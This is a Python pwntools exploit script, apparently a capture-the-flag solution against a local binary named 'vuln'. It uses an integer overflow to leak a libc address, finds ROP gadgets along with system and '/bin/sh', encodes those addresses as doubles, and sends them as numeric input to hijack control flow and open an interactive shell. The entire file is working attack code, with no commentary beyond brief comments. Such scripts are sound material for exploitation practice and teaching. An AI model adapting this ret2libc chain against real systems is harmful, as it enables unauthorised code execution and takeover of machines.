from pwn import *
import struct
import time

context.log_level = 'INFO'
context.binary = binary = ELF('./vuln', checksec=False)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

# Convert addresses to double for input
def pointerToDouble(pointer_value):
        bytes = p64(pointer_value)
        unpacked = struct.unpack('d', bytes)
        return unpacked[0]

program = process()

# Exploit integer overflow to get libc leak
program.sendlineafter(b'a: ', b'2000000000')
program.sendlineafter(b'b: ', b'2000000000')

program.recvuntil(b'This might help with the next step: ')

# Handle libc leak and calculate addresses
putsLibc = int(program.recvline().strip(), 16)
libc.address = putsLibc - libc.symbols.puts

success(f'puts leak: {hex(putsLibc)}')
success(f'libc base: {hex(libc.address)}')

rop = ROP(libc)
pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

success(f'pop rdi; ret: {hex(pop_rdi_ret)}')
success(f'ret: {hex(ret)}')

system = libc.symbols.system
bin_sh = next(libc.search(b'/bin/sh\x00'))

success(f'system: {hex(system)}')
success(f'/bin/sh: {hex(bin_sh)}')

# Craft and send ROP chain
exploitPayload = [b'1' for i in range(17)]
exploitPayload.append(b'.')
exploitPayload.append(b'1')
exploitPayload.append(str(pointerToDouble(ret)).encode())
exploitPayload.append(str(pointerToDouble(pop_rdi_ret)).encode())
exploitPayload.append(str(pointerToDouble(bin_sh)).encode())
exploitPayload.append(str(pointerToDouble(system)).encode())

program.sendlineafter(b'How many values do you want to enter?\n', f'{len(exploitPayload)}'.encode())

for byte in exploitPayload:
	program.sendline(byte)

program.interactive()
